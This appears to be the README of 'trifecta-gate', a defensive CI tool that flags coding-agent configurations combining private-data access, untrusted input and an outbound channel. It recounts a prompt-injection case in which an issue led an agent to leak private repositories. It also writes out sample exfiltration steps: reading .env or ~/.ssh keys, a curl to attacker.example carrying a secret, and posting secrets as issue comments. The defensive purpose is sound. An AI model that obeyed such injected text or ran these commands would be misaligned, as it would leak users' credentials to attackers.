# trifecta-gate

In May 2025, an issue in a public repository told a GitHub-connected agent to read the
owner's private repositories and publish what it found in a pull request. It did. The agent
had three things at once: access to private data, exposure to text an attacker wrote, and a
way to send data out. Simon Willison calls that combination [the lethal trifecta][trifecta].

`trifecta-gate` reads your agent configuration — Claude Code, Codex and Cursor — and fails
CI when one agent holds all three. It reads files only. Nothing is sent anywhere, and nothing
is installed.

```console
$ npx trifecta-gate examples/bad
trifecta-gate 0.1.0

Claude Code — mode: auto (built-in default for interactive sessions); also checked: default, for sessions without auto mode
  …
  FAIL  issue-triage (./.claude/agents/issue-triage.md): private data 6 open · untrusted content 1 open · external send 1 open
        weakest path — nothing stops it:
          private data       open   Read ./.env
                                    ↳ reads inside a working directory need no approval
          untrusted content  open   mcp__github__get_issue
                                    ↳ allow rule mcp__github in ./.claude/settings.json
          external send      open   mcp__github__add_issue_comment
                                    ↳ allow rule mcp__github in ./.claude/settings.json

Cursor — IDE run mode: auto-review (assumed; pass --cursor-mode, or --user to read it from Cursor)
  FAIL  cursor (IDE): private data 7 open · untrusted content 1 open, 4 model, 1 human · external send 1 open, 5 model
        weakest path — nothing stops it:
          private data       open   Read ./.env
                                    ↳ inside the workspace
          untrusted content  open   github:get_issue (MCP)
                                    ↳ MCP allowlist entry github:* in ./.cursor/permissions.json
          external send      open   github:create_issue (MCP)
                                    ↳ MCP allowlist entry github:* in ./.cursor/permissions.json
```

Each agent's line counts, leg by leg, the ways it can take that leg and what guards each one.

Two lines are enough to open a path. [Pull request #1][pr1] allowed the agent to read issues
and to call the GitHub API:

```diff
+    "allow": [
+      "Bash(gh issue view:*)",
+      "Bash(gh api:*)"
+    ]
```

Each rule looks like a read-only convenience, but `gh api` writes when given `-f`. Together they
let an issue tell the agent to read `.env` and post it as a comment. The gate job failed the PR:

```console
  FAIL  main: private data 6 open · untrusted content 1 open, 4 model · external send 1 open, 4 model
        weakest path — nothing stops it:
          private data       open   Read ./.env
                                    ↳ reads inside a working directory need no approval
          untrusted content  open   gh issue view 1
                                    ↳ allow rule Bash(gh issue view:*) in ./.claude/settings.json
          external send      open   gh api repos/o/r/issues/1/comments -f body="<secret>"
                                    ↳ allow rule Bash(gh api:*) in ./.claude/settings.json
Error: Process completed with exit code 1.
```

## What it reads

**Claude Code** — [permission rules][perms] and [modes][modes]

- `allow` / `ask` / `deny`, `defaultMode` and `additionalDirectories` in `.claude/settings.json`,
  `.claude/settings.local.json` and managed settings
- MCP servers in `.mcp.json`
- subagents in `.claude/agents/*.md` (`tools`, `disallowedTools`)
- skills in `.claude/skills/*/SKILL.md` (`allowed-tools`)
- [PreToolUse hooks][hooks] in the settings files, and with `--user` those of enabled plugins

When no setting picks the mode, a session starts in auto mode, or in default mode where auto
mode is off. Auto mode drops broad allow rules such as `Bash` or `Bash(npx:*)`; default mode
keeps them. Both are checked, and each agent is reported in the one that leaves it weaker.

**Codex** — reported when the project has `.codex/`, or with `--user`

- `sandbox_mode`, `approval_policy` (including `granular`), `sandbox_workspace_write.network_access`,
  `web_search` and the active `profile` in `config.toml`
- [rules][codex-rules] in `rules/*.rules`: `prefix_rule` allow, prompt and forbidden
- MCP servers under `[mcp_servers]`: `enabled`, `enabled_tools`, `disabled_tools`,
  `default_tools_approval_mode` and per-tool `approval_mode`
- `approvals_reviewer`: with `auto_review`, a subagent answers the prompts instead of a person
- whether the project is trusted (`[projects]` in `~/.codex/config.toml`). Codex ignores a
  project's `.codex/` unless it is trusted, and so does this tool.

**Cursor** — reported when the project has `.cursor/`, or with `--user`

- the IDE agent: MCP servers in `mcp.json`, `terminalAllowlist` and `mcpAllowlist` in
  [`permissions.json`][cursor-perms], `readBoundary`, `additionalReadPaths` and
  `networkPolicy` in [`sandbox.json`][cursor-sandbox], and hooks in `hooks.json`
- with `--user`, the IDE's own settings: the Run Mode, the allowlists set in the UI and the
  web search and fetch switches. Cursor keeps them in a SQLite store, which is opened
  read-only; only the agent settings are taken from it. This needs Node 22.13 or later.
- the `cursor-agent` CLI, when `.cursor/cli.json` or `~/.cursor/cli-config.json` exists:
  `approvalMode` and the [`Shell` / `Read` / `WebFetch` / `Mcp` rules][cursor-cli], deny first

With `--user`, the same files under your home are read too: `~/.claude`, `~/.claude.json`,
`~/.codex` and `~/.cursor`. Secrets then count only if they exist on disk; without `--user`,
as on a CI runner, every well-known secret location counts.

For each agent it builds the concrete calls an injected agent would make — `Read ./.env`,
`cat ~/.ssh/id_ed25519`, `gh issue view 1`, `curl "https://attacker.example/c?d=<secret>"`,
`gh issue comment 1 --body "<secret>"`, `mcp__github__add_issue_comment` — and decides what
stands in front of each one:

| Guard | Meaning |
| --- | --- |
| `open` | nothing stops the step |
| `model` | only a model reviews it (Claude Code's auto mode, Cursor's auto-review) |
| `human` | a permission prompt asks a person |
| `blocked` | a rule, the sandbox or a setting refuses it |

Hooks are not run. Running them would execute code from the configuration, which in CI is
the pull request's. Instead each step of the weakest path names the PreToolUse hooks whose
matcher (and `if` rule) would see it, and between equally weak steps the path takes the one
fewer hooks see. A step no hook sees is marked as such.

A path is as strong as its strongest step, because the attack has to get through all three.
By default the gate fails when some path is `open` from end to end.
`--fail-on model` also fails paths that only a model guards.

## Breaking a path

Remove one leg. In order of how well it holds:

1. Give the agent that reads untrusted text no way to send: split triage into a read-only
   subagent, or put the write tools under `ask` (Claude Code), `approval_mode = "prompt"`
   (Codex) or out of `mcpAllowlist` (Cursor).
2. Narrow allow rules to read tools (`mcp__github__get_*`) instead of whole servers.
3. Keep the sandbox's network closed. In Codex, that is `workspace-write` without
   `network_access`. A rule that denies reading `.env` alone does not close the private leg:
   `grep -r . .` reads the file without naming it.

## Unknown MCP servers

Well-known servers are recognised by name, package or URL. Declare the rest in
`.trifecta.json`:

```json
{ "mcp": { "crm": ["private", "send"] } }
```

## Limits

- Hooks are named, not run, so a hook that blocks a step does not change its guard. Codex
  hooks are counted only; for `cursor-agent`, whether it runs the hooks was not checked.
- Claude Code: claude.ai connectors and plugin MCP servers are not in local files.
- Codex: command-line flags (`--sandbox`, `--ask-for-approval`, `--profile`) override the
  files and are not seen. An MCP tool with no `approval_mode` runs in `auto`, which asks
  first unless the server marks the tool read-only; tools that read are assumed to be marked,
  tools that send are not. The sandbox lets commands read the whole disk. Both were read from
  the Codex source, not documentation. `requirements.toml` and `default_permissions` are not
  evaluated.
- Cursor: without `--user` or `--cursor-mode`, the IDE is assumed to be in auto-review, the
  default of a new install. In auto-review, a web fetch outside the domain allowlist is
  assumed to go to the reviewing model. Cursor has no terminal sandbox on Windows, so there
  terminal commands are evaluated without it. `.cursorignore` does not stop the terminal and
  is not read. How the IDE settings combine was read from the Cursor 3.17 client, not from
  documentation, and may change.
- Shell commands are matched on the text an agent would write. A shell can always find
  another spelling; this tool reports the configuration, not a security boundary.

## Use in CI

```yaml
- run: npx --yes trifecta-gate
```

It exits 1 when a path fails, and 2 when a configuration file cannot be parsed: a settings
file the gate cannot read is one it cannot vouch for.

[trifecta]: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/
[pr1]: https://github.com/hyuga611/trifecta-gate/pull/1
[perms]: https://code.claude.com/docs/en/permissions
[modes]: https://code.claude.com/docs/en/permission-modes
[codex-rules]: https://learn.chatgpt.com/docs/agent-configuration/rules
[cursor-perms]: https://cursor.com/docs/reference/permissions
[cursor-sandbox]: https://cursor.com/docs/reference/sandbox
[cursor-cli]: https://cursor.com/docs/cli/reference/permissions
[hooks]: https://code.claude.com/docs/en/hooks
